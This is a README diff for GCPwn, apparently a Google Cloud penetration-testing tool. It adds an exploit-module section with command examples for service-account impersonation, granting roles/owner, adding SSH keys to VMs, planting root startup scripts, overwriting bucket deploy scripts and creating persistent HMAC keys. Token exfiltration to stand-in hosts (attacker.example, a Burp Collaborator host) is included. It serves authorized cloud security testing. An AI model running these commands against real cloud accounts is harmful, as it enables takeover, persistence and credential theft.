@@ -16,6 +16,7 @@
 - [Installation TLDR](#installation-tldr)
 - [First-Run TLDR](#first-run-tldr)
 - [Passthrough Mode TLDR](#passthrough-mode-tldr)
+- [Exploit Module TLDR](#exploit-module-tldr)
 - [OpenGraph TLDR](#opengraph-tldr)
 - [Module/Data Output TLDR](#moduledata-output-tldr)
 - [Audit / Logging TLDR](#audit--logging-tldr)
@@ -294,6 +295,137 @@ gcpwn --module enum_gcp --workspace WORKSPACE_NAME --cred CRED_NAME --all-projec
 Everything after the recognized flags is passed straight to the module, so `-h` and module-specific flags work in passthrough too. `--workspace`/`--cred` are what switch it from the unauthenticated path to the authenticated drive-through.
 
 As in the first-run examples, `--parallel-services N` (accepted by `enum_all`/`enum_gcp`) enumerates GCP services concurrently across projects — **default is `1` = sequential**; set it higher to fan out. In drive-through it's resumable: if a run is interrupted, re-run the exact same command and completed `(project, service)` units are skipped.
+
+## Exploit Module TLDR
+
+GCPwn ships a set of exploit modules organized into five categories. All modules share the same passthrough invocation pattern — `--module <name>` plus any module-specific flags. Pass `-h` to any module for the full flag list, or see the [Exploit Module Reference](https://github.com/NetSPI/gcpwn/wiki/Exploit-Module-Reference) wiki page for deep-dive examples, flag tables, and native `gcloud` equivalents.
+
+### Single-Permission Movement
+
+These exploits require only **one key permission** to reach a target SA identity or elevate access. No `iam.serviceAccounts.actAs` needed.
+
+```bash
+# Mint a short-lived OAuth2 access token for a target SA
+# (requires iam.serviceAccounts.getAccessToken on the target)
+modules run exploit_generate_access_token \
+  --target-sa projects/PROJECT_ID/serviceAccounts/TARGET_SA_EMAIL
+
+# Create a long-lived SA JSON key (no expiry — persists indefinitely)
+# (requires iam.serviceAccountKeys.create on the target)
+modules run exploit_service_account_keys \
+  --create \
+  --target-sa projects/PROJECT_ID/serviceAccounts/TARGET_SA_EMAIL \
+  --assume
+
+# Grant any IAM role on any supported resource type
+# (requires <resource>.setIamPolicy)
+modules run exploit_gcp_setiampolicy \
+  --service project \
+  --project-id PROJECT_ID \
+  --member user:attacker@example.com \
+  --role roles/owner
+```
+
+### Multi-Permission Movement — Arbitrary GCP API SA Calls
+
+These services let you schedule HTTP requests authenticated as a target SA, turning service-management permissions (`cloudscheduler.jobs.create` / `cloudtasks.tasks.create`) + `iam.serviceAccounts.actAs` into arbitrary `googleapis.com` API calls on the SA's behalf.
+
+```bash
+# Create a Cloud Scheduler job that calls setIamPolicy as a privileged SA
+# (requires cloudscheduler.jobs.create + iam.serviceAccounts.actAs on TARGET_SA)
+modules run exploit_cloudscheduler_job \
+  --target-sa TARGET_SA_EMAIL \
+  --action make-admin \
+  --read-response \
+  --cleanup
+
+# Create a Cloud Tasks HTTP task authenticated as a target SA (oauthToken or oidcToken)
+# (requires cloudtasks.tasks.create + iam.serviceAccounts.actAs on TARGET_SA)
+modules run exploit_cloudtasks_task_as_sa \
+  --target-sa TARGET_SA_EMAIL \
+  --action make-admin \
+  --read-response \
+  --cleanup
+```
+
+> **Note:** Response bodies are never returned by Cloud Scheduler or Cloud Tasks. Only side-effect mutations (IAM grants, key enables, etc.) are viable. To receive a token, use [OIDC Access](#exploit-module-tldr-oidc-access) paths below.
+
+### OIDC Access
+
+These paths deliver a **Google-signed OIDC JWT** proving the target SA's identity to an attacker-controlled HTTPS endpoint. The OIDC token is not a `ya29.*` OAuth2 access token — use it for Cloud Run/IAP authentication, cross-cloud WIF exchange, or proving SA identity to third-party APIs.
+
+```bash
+# Create an API Gateway with TARGET_SA as the service account;
+# ESPv2 delivers a Google-signed OIDC JWT to your callback URL on every request
+# (requires apigateway.apiconfigs.create + apigateway.gateways.create/update
+#  + iam.serviceAccounts.actAs on TARGET_SA;
+#  minimal path: apiconfigs.create + gateways.update only)
+modules run exploit_apigateway_as_sa_oidc \
+  --target-sa TARGET_SA_EMAIL \
+  --exfil-url https://BURP_COLLABORATOR_HOST/apigw \
+  --cleanup
+
+# Once you have the OIDC JWT, parse it and optionally exchange via WIF:
+modules run exploit_apigateway_as_sa_oidc \
+  --oidc-token eyJhbGciOiJSUzI1NiJ9... \
+  --wif-provider projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID \
+  --save-as-cred wif-access-token
+```
+
+### Notable Single Permissions
+
+These permissions provide direct infrastructure write access — SSH keys or startup scripts — without `iam.serviceAccounts.actAs`.
+
+```bash
+# Add an SSH public key to project metadata — grants shell access to ALL VMs
+# (requires compute.projects.setCommonInstanceMetadata)
+modules run exploit_instance_ssh_keys \
+  --project-level \
+  --ssh-key-file ~/.ssh/id_ed25519.pub \
+  --username attacker
+
+# Add an SSH public key to a single instance
+# (requires compute.instances.setMetadata)
+modules run exploit_instance_ssh_keys \
+  --instance-level \
+  --instance-name projects/PROJECT_ID/zones/us-central1-a/instances/web-server \
+  --ssh-key-file ~/.ssh/id_ed25519.pub \
+  --username attacker
+
+# Set a startup script on an existing instance via stop/start;
+# script runs as root and can exfil the attached SA's OAuth2 token
+# (requires compute.instances.stop + .start + .setMetadata)
+modules run exploit_instance_startup_script \
+  --update-via-shutdown \
+  --instance-name projects/PROJECT_ID/zones/us-central1-a/instances/batch-runner \
+  --external-url https://attacker.example/collect
+```
+
+### Data Access Permissions
+
+These modules exploit write access to GCS or the ability to create persistent HMAC credentials that survive IAM changes.
+
+```bash
+# Overwrite a GCS object (e.g. a deploy script, config file)
+# (requires storage.objects.create on the target bucket)
+modules run exploit_bucket_upload \
+  --bucket victim-configs \
+  --remote-blob-path deploy/startup.sh \
+  --local-blob-path ./payload.sh
+
+# Create an HMAC key tied to a target SA — long-lived, S3-compatible,
+# survives IAM policy changes and SA key rotations
+# (requires storage.hmacKeys.create; SA needs storage.*.list/get to enumerate)
+modules run exploit_storage_hmac \
+  --sa-email TARGET_SA_EMAIL \
+  --buckets \
+  --blobs \
+  --download
+```
+
+See the [Exploit Module Reference](https://github.com/NetSPI/gcpwn/wiki/Exploit-Module-Reference) for the full flag reference, native `gcloud` equivalents, example scenarios, and the complete table of released and coming-soon modules.
+
+---
 
 ## OpenGraph TLDR
 
